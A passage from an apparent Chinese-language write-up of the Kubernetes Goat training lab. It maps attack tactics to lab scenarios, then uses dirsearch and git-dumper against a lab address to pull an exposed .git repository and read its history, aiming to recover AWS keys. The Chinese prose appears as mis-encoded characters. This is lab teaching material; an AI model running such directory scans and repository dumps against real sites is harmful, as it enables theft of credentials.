<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-16/rbac-least-privileges-misconfiguration-in-kubernetes-cluster">âˆ RBAC least privileges misconfiguration</a></td>
</tr>
<tr>
<td>Mount service principal</td>
<td></td>
</tr>
<tr>
<td>Container service account</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-16/rbac-least-privileges-misconfiguration-in-kubernetes-cluster">âˆ RBAC least privileges misconfiguration</a></td>
</tr>
<tr>
<td>Application credentials in configuration files</td>
<td></td>
</tr>
<tr>
<td>Access managed identity credentials</td>
<td></td>
</tr>
<tr>
<td>Malicious admission controller</td>
<td></td>
</tr>
</tbody></table>
<h2 id="2-7-Discovery"><a href="#2-7-Discovery" class="headerlink" title="2.7 Discovery"></a>2.7 Discovery</h2><p>å‘ç°ç­–ç•¥åŒ…æ‹¬æ”»å‡»è€…ç”¨æ¥æ¢ç´¢å…¶å·²è·å¾—è®¿é—®æƒé™çš„ç¯å¢ƒçš„æŠ€æœ¯ã€‚è¿™ç§æ¢ç´¢æœ‰åŠ©äºæ”»å‡»è€…è¿›è¡Œæ¨ªå‘ç§»åŠ¨å¹¶è·å¾—å¯¹é¢å¤–èµ„æºçš„è®¿é—®æƒé™ã€‚</p>
<table>
<thead>
<tr>
<th><strong>ğŸ§° Techniques</strong></th>
<th><strong>ğŸ Kubernetes Goat Scenarios</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Access Kubernetes API server</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-17/auditing-the-kubernetes-cluster-using-kubeaudit">âˆ KubeAudit - Audit Kubernetes clusters</a></td>
</tr>
<tr>
<td>Access Kubelet API</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-4/container-escape-to-the-host-system-in-kubernetes-containers">âˆ Container escape to the host system</a></td>
</tr>
<tr>
<td>Network mapping</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-11/kubernetes-namespaces-bypass-from-kubernetes-cluster-pod">âˆ Kubernetes namespaces bypass</a></td>
</tr>
<tr>
<td>Exposed sensitive interfaces</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-11/kubernetes-namespaces-bypass-from-kubernetes-cluster-pod">âˆ Kubernetes namespaces bypass</a> <a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-8/misconfigured-nodeport-exposed-service-in-kubernetes">âˆ NodePort exposed services</a></td>
</tr>
<tr>
<td>Instance Metadata API</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-3/ssrf-in-the-kubernetes-world">âˆ SSRF in the Kubernetes (K8S) world</a></td>
</tr>
</tbody></table>
<h2 id="2-8-Lateral-Movement"><a href="#2-8-Lateral-Movement" class="headerlink" title="2.8 Lateral Movement"></a>2.8 Lateral Movement</h2><p>æ¨ªå‘ç§»åŠ¨ç­–ç•¥åŒ…æ‹¬æ”»å‡»è€…ç”¨æ¥åœ¨å—å®³è€…ç¯å¢ƒä¸­ç§»åŠ¨çš„æŠ€æœ¯ã€‚åœ¨å®¹å™¨åŒ–ç¯å¢ƒä¸­ï¼Œè¿™åŒ…æ‹¬ä»å¯¹ä¸€ä¸ªå®¹å™¨çš„ç»™å®šè®¿é—®æƒé™ä¸­è·å¾—å¯¹é›†ç¾¤ä¸­å„ç§èµ„æºçš„è®¿é—®æƒé™ï¼Œä»å®¹å™¨è·å¾—å¯¹åº•å±‚èŠ‚ç‚¹çš„è®¿é—®æƒé™ï¼Œæˆ–è·å¾—å¯¹äº‘ç¯å¢ƒçš„è®¿é—®æƒé™ã€‚</p>
<table>
<thead>
<tr>
<th><strong>ğŸ§° Techniques</strong></th>
<th><strong>ğŸ Kubernetes Goat Scenarios</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Access cloud resources</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-3/ssrf-in-the-kubernetes-world">âˆ SSRF in the Kubernetes (K8S) world</a></td>
</tr>
<tr>
<td>Container service account</td>
<td></td>
</tr>
<tr>
<td>Cluster internal networking</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-11/kubernetes-namespaces-bypass-from-kubernetes-cluster-pod">âˆ Kubernetes namespaces bypass</a></td>
</tr>
<tr>
<td>Application credentials in configuration files</td>
<td></td>
</tr>
<tr>
<td>Writable hostPath mount</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-4/container-escape-to-the-host-system-in-kubernetes-containers">âˆ Container escape to the host system</a></td>
</tr>
<tr>
<td>CoreDNS poisoning</td>
<td></td>
</tr>
<tr>
<td>ARP poisoning and IP spoofing</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-11/kubernetes-namespaces-bypass-from-kubernetes-cluster-pod">âˆ Kubernetes namespaces bypass</a></td>
</tr>
</tbody></table>
<h2 id="2-9-Collection"><a href="#2-9-Collection" class="headerlink" title="2.9 Collection"></a>2.9 Collection</h2><p>åœ¨Kubernetesä¸­ï¼Œâ€œæ”¶é›†â€æŒ‡çš„æ˜¯æ”»å‡»è€…ç”¨æ¥ä»é›†ç¾¤ä¸­æ”¶é›†æ•°æ®æˆ–åˆ©ç”¨é›†ç¾¤è¿›è¡Œæ•°æ®æ”¶é›†çš„æŠ€æœ¯æ‰‹æ®µã€‚</p>
<table>
<thead>
<tr>
<th><strong>ğŸ§° Techniques</strong></th>
<th><strong>ğŸ Kubernetes Goat Scenarios</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Images from a private registry</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-7/attacking-private-container-registry-in-kubernetes">âˆ Attacking private registry</a></td>
</tr>
<tr>
<td>Collecting data from pod</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-12/gain-environment-information-in-kubernetes-cluster">âˆ Gaining environment information</a></td>
</tr>
</tbody></table>
<h2 id="2-10-Impact"><a href="#2-10-Impact" class="headerlink" title="2.10 Impact"></a>2.10 Impact</h2><p>å½±å“æˆ˜æœ¯åŒ…æ‹¬æ”»å‡»è€…ç”¨æ¥ç ´åã€æ»¥ç”¨æˆ–å¹²æ‰°ç¯å¢ƒæ­£å¸¸è¡Œä¸ºçš„æŠ€æœ¯ã€‚</p>
<table>
<thead>
<tr>
<th><strong>ğŸ§° Techniques</strong></th>
<th><strong>ğŸ Kubernetes Goat Scenarios</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Data destruction</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-2/docker-in-docker-exploitation-in-kubernetes-containers">âˆ DIND (docker-in-docker) exploitation</a> <a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-4/container-escape-to-the-host-system-in-kubernetes-containers">âˆ Container escape to the host system</a></td>
</tr>
<tr>
<td>Resource hijacking</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-13/denial-of-service-memory-and-cpu-resources-in-kubernetes-cluster">âˆ DoS the Memory/CPU resources</a></td>
</tr>
<tr>
<td>Denial of service</td>
<td><a target="_blank" rel="noopener" href="https://madhuakula.com/docs/scenarios/scenario-13/denial-of-service-memory-and-cpu-resources-in-kubernetes-cluster">âˆ DoS the Memory/CPU resources</a></td>
</tr>
</tbody></table>
<h1 id="ä¸‰ã€åœºæ™¯å®è·µ"><a href="#ä¸‰ã€åœºæ™¯å®è·µ" class="headerlink" title="ä¸‰ã€åœºæ™¯å®è·µ"></a>ä¸‰ã€åœºæ™¯å®è·µ</h1><h2 id="3-1-Sensitive-keys-in-codebasesğŸŒŸ"><a href="#3-1-Sensitive-keys-in-codebasesğŸŒŸ" class="headerlink" title="3.1 Sensitive keys in codebasesğŸŒŸ"></a>3.1 Sensitive keys in codebasesğŸŒŸ</h2><p>å¦‚ä½•åœ¨ä»£ç åº“ä¸­æŸ¥æ‰¾æ•æ„Ÿå¯†é’¥ã€‚</p>
<h3 id="3-1-1-åœºæ™¯ä»‹ç»"><a href="#3-1-1-åœºæ™¯ä»‹ç»" class="headerlink" title="3.1.1 åœºæ™¯ä»‹ç»"></a>3.1.1 åœºæ™¯ä»‹ç»</h3><p>æ­¤åœºæ™¯èšç„¦äºå¼€å‘äººå‘˜å’ŒDevOpså›¢é˜Ÿåœ¨æ‰“åŒ…ç»„ä»¶å’Œåº”ç”¨ç¨‹åºä»£ç åº“æ—¶çš„ä¸€äº›å¸¸è§é”™è¯¯ã€‚è¿™äº›é”™è¯¯åœ¨ç°å®ä¸–ç•Œä¸­ä¼šäº§ç”Ÿå½±å“ï¼Œæ¯”å¦‚å¯¼è‡´ç»„ç»‡åŠå…¶å®é™…ç¯å¢ƒä¸­çš„åŸºç¡€è®¾æ–½é­åˆ°ç ´åã€‚</p>
<p>å¼€å‘è€…å¾€å¾€ä¼šå°†æ•æ„Ÿä¿¡æ¯æäº¤åˆ°ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿä¸­ã€‚éšç€æˆ‘ä»¬å‘<strong>æŒç»­é›†æˆ/æŒç»­äº¤ä»˜</strong>ï¼ˆCI/CDï¼‰å’Œ GitOps ç³»ç»Ÿè¿ˆè¿›ï¼Œæˆ‘ä»¬å¾€å¾€ä¼šå¿˜è®°è¯†åˆ«ä»£ç å’Œæäº¤ä¸­çš„æ•æ„Ÿä¿¡æ¯ã€‚</p>
<p>å®è·µç›®æ ‡ï¼š</p>
<ol>
<li>å¦‚ä½•æµ‹è¯• Web åº”ç”¨ç¨‹åºå…¥å£ç‚¹çš„å®‰å…¨é…ç½®é”™è¯¯ã€‚</li>
<li>æ‰“åŒ…åº”ç”¨ç¨‹åºå’Œå®¹å™¨çš„å¸¸è§é”™è¯¯æˆ–é…ç½®é”™è¯¯ã€‚</li>
<li>æ£€æµ‹ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿä¸­ä»£ç åº“çš„æ•æ„Ÿå¯†é’¥å’Œä¿¡æ¯ã€‚</li>
<li>ä½¿ç”¨å¼€æºå·¥å…·è¯†åˆ«å’Œæ£€æµ‹æœºå¯†ä¿¡æ¯ã€‚</li>
</ol>
<p>å›¾ç¤ºï¼š</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2017.37.54.png" style="zoom:40%;">

<h3 id="3-1-2-åœºæ™¯è®¿é—®"><a href="#3-1-2-åœºæ™¯è®¿é—®" class="headerlink" title="3.1.2 åœºæ™¯è®¿é—®"></a>3.1.2 åœºæ™¯è®¿é—®</h3><p><a target="_blank" rel="noopener" href="http://192.168.52.13:1230/">http://192.168.52.13:1230/</a></p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2015.59.41.png" style="zoom:50%;">

<ul>
<li><p>è¯†åˆ«ä»£ç åº“ä¸­å¯ç”¨çš„æ•æ„Ÿå¯†é’¥ï¼ŒåŒ…æ‹¬åº”ç”¨ç¨‹åºä»£ç ã€å®¹å™¨å’ŒåŸºç¡€è®¾æ–½ã€‚</p>
</li>
<li><p>ç›®æ ‡æ˜¯è·å¾— AWS çš„ aws_access_key_id å’Œ aws_secret_access_key ä»¥åŠ k8s-goat-FLAG flagã€‚</p>
</li>
</ul>
<h3 id="3-1-3-æ–¹æ³•ä¸€ï¼ˆåˆ†æ-gitå†å²åˆ†æ”¯ï¼‰"><a href="#3-1-3-æ–¹æ³•ä¸€ï¼ˆåˆ†æ-gitå†å²åˆ†æ”¯ï¼‰" class="headerlink" title="3.1.3 æ–¹æ³•ä¸€ï¼ˆåˆ†æ.gitå†å²åˆ†æ”¯ï¼‰"></a>3.1.3 æ–¹æ³•ä¸€ï¼ˆåˆ†æ.gitå†å²åˆ†æ”¯ï¼‰</h3><p>é˜…è¯»æœåŠ¡ä»‹ç»å¯ä»¥åˆ¤æ–­æ˜¯ä¸€ä¸ªé€šè¿‡gitå‘å¸ƒçš„å®¹å™¨åŒ–åº”ç”¨ã€‚</p>
<ul>
<li>dirsearch ç›®å½•æ‰«æ</li>
</ul>
<p>æ‰§è¡Œç›®å½•æ‰«æï¼Œå¯ä»¥ç¡®å®šè¯¥åº”ç”¨ç¨‹åºä¸­æš´éœ²äº†ä¸€ä¸ª .git æ–‡ä»¶å¤¹ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>python3.9<span class="token punctuation">)</span>  ~/dirsearch î‚° î‚  master î‚° python dirsearch.py <span class="token parameter variable">-u</span> http://192.168.52.13:1230/

  _<span class="token operator">|</span><span class="token builtin class-name">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0.4.3
 <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span>/_<span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>

Extensions: php, asp, aspx, jsp, html, htm <span class="token operator">|</span> HTTP method: GET <span class="token operator">|</span> Threads: <span class="token number">25</span> <span class="token operator">|</span> Wordlist size: <span class="token number">12289</span>

Target: http://192.168.52.13:1230/

<span class="token punctuation">[</span><span class="token number">16</span>:05:56<span class="token punctuation">]</span> Scanning:
<span class="token punctuation">[</span><span class="token number">16</span>:05:59<span class="token punctuation">]</span> <span class="token number">200</span> -   535B - /.git/index
<span class="token punctuation">[</span><span class="token number">16</span>:05:59<span class="token punctuation">]</span> <span class="token number">200</span> -   240B - /.git/info/exclude
<span class="token punctuation">[</span><span class="token number">16</span>:06:00<span class="token punctuation">]</span> <span class="token number">200</span> -    2KB - /.git/logs/HEAD
<span class="token punctuation">[</span><span class="token number">16</span>:06:00<span class="token punctuation">]</span> <span class="token number">200</span> -    92B - /.git/config
<span class="token punctuation">[</span><span class="token number">16</span>:06:00<span class="token punctuation">]</span> <span class="token number">200</span> -   263B - /.git/COMMIT_EDITMSG
<span class="token punctuation">[</span><span class="token number">16</span>:06:00<span class="token punctuation">]</span> <span class="token number">200</span> -    23B - /.git/HEAD
<span class="token punctuation">[</span><span class="token number">16</span>:06:00<span class="token punctuation">]</span> <span class="token number">200</span> -    2KB - /.git/logs/refs/heads/master
<span class="token punctuation">[</span><span class="token number">16</span>:06:00<span class="token punctuation">]</span> <span class="token number">200</span> -    92B - /.gitconfig
<span class="token punctuation">[</span><span class="token number">16</span>:06:01<span class="token punctuation">]</span> <span class="token number">200</span> -    73B - /.git/description
<span class="token punctuation">[</span><span class="token number">16</span>:06:03<span class="token punctuation">]</span> <span class="token number">200</span> -    41B - /.git/refs/heads/master
<span class="token punctuation">[</span><span class="token number">16</span>:06:43<span class="token punctuation">]</span> <span class="token number">200</span> -     4B - /ping

Task Completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2016.21.56.png" style="zoom:50%;">

<ul>
<li>å…‹éš†è¿œç¨‹ä»“åº“</li>
</ul>
<blockquote>
<h4 id="git-dumper"><a href="#git-dumper" class="headerlink" title="git-dumper"></a>git-dumper</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> git-dumper<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2016.30.25.png" style="zoom:40%;">

<p>æ— é¡»å…‹éš†é¡¹ç›®ï¼Œç›´æ¥pipå®‰è£…å³å¯ã€‚</p>
</blockquote>
<p>ä½¿ç”¨å¼€æºå·¥å…·ï¼ˆå¦‚git-dumper [<a target="_blank" rel="noopener" href="https://github.com/arthaud/git-dumper]%EF%BC%89%E4%BB%8E%E8%BF%9C%E7%A8%8B%E7%BD%91%E7%AB%99%E5%9C%A8%E6%9C%AC%E5%9C%B0%E5%85%8B%E9%9A%86%E8%AF%A5git%E4%BB%93%E5%BA%93%E3%80%82">https://github.com/arthaud/git-dumper]ï¼‰ä»è¿œç¨‹ç½‘ç«™åœ¨æœ¬åœ°å…‹éš†è¯¥gitä»“åº“ã€‚</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">git-dumper http://192.168.52.13:1230/.git k8s-goat-git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2016.32.48.png" style="zoom:35%;">

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2016.35.24.png" style="zoom:50%;">

<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹æ—¥å¿—å’Œä¹‹å‰çš„æäº¤å†å²æ¥éªŒè¯ Git å†å²è®°å½•å’Œä¿¡æ¯ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">commit 905dcec070d86ce60822d790492d7237884df60a <span class="token punctuation">(</span>HEAD -<span class="token operator">&gt;</span> master<span class="token punctuation">)</span>
Author: Madhu Akula <span class="token operator">&lt;</span>madhu.akula@hotmail.com<span class="token operator">&gt;</span>
Date:   Fri Nov <span class="token number">6</span> <span class="token number">23</span>:42:28 <span class="token number">2020</span> +0100

    Final release

commit 3292ff3bd8d96f192a9d4eb665fdd1014d87d3df
Author: Madhu Akula <span class="token operator">&lt;</span>madhu.akula@hotmail.com<span class="token operator">&gt;</span>
Date:   Fri Nov <span class="token number">6</span> <span class="token number">23</span>:40:59 <span class="token number">2020</span> +0100

    Updated the docs

commit 7daa5f4cda812faa9c62966ba57ee9047ee6b577
Author: Madhu Akula <span class="token operator">&lt;</span>madhu.akula@hotmail.com<span class="token operator">&gt;</span>
Date:   Fri Nov <span class="token number">6</span> <span class="token number">23</span>:39:21 <span class="token number">2020</span> +0100

    updated the endpoints and routes

commit d7c173ad183c574109cd5c4c648ffe551755b576
Author: Madhu Akula <span class="token operator">&lt;</span>madhu.akula@hotmail.com<span class="token operator">&gt;</span>
Date:   Fri Nov <span class="token number">6</span> <span class="token number">23</span>:31:06 <span class="token number">2020</span> +0100

    Inlcuded custom environmental variables

commit bb2967a6f26fb59bf64031bbb14b4f3e233944ca
Author: Madhu Akula <span class="token operator">&lt;</span>madhu.akula@hotmail.com<span class="token operator">&gt;</span>
Date:   Fri Nov <span class="token number">6</span> <span class="token number">23</span>:28:33 <span class="token number">2020</span> +0100

    Added <span class="token function">ping</span> endpoint

commit 599f377bde4c3c5c8dc0d7700194b5b2b0643c0b
Author: Madhu Akula <span class="token operator">&lt;</span>madhu.akula@hotmail.com<span class="token operator">&gt;</span>
Date:   Fri Nov <span class="token number">6</span> <span class="token number">23</span>:24:56 <span class="token number">2020</span> +0100

    Basic working go server with fiber

commit 4dc0726a546f59e0f4cda837a07032c62ee137bf
Author: Madhu Akula <span class="token operator">&lt;</span>madhu.akula@hotmail.com<span class="token operator">&gt;</span>
